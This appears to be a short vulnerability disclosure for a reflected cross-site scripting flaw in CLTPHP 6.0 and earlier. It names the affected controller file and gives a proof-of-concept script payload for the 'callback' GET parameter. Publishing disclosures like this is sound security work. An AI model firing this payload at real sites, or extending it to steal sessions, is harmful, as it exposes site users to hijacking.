# CLTPHP <= 6.0 Reflected cross-site scripting(XSS)
## Description
    The system client does not handle GET parameters correctly, resulting in reflected cross-site scripting (XSS).
## Vendor Homepage
    https://gitee.com/chichu/cltopen/
    https://www.cltphp.com/

## Author
    HuBen-Lab
## Proof of Concept
File:`application/home/controller/Changyan.php `

payload:

```
?callback=<script>alert(%27Vulnerable%27);</script>
```

![image-20230105094414169](img/63b7c3b68d8f1.png)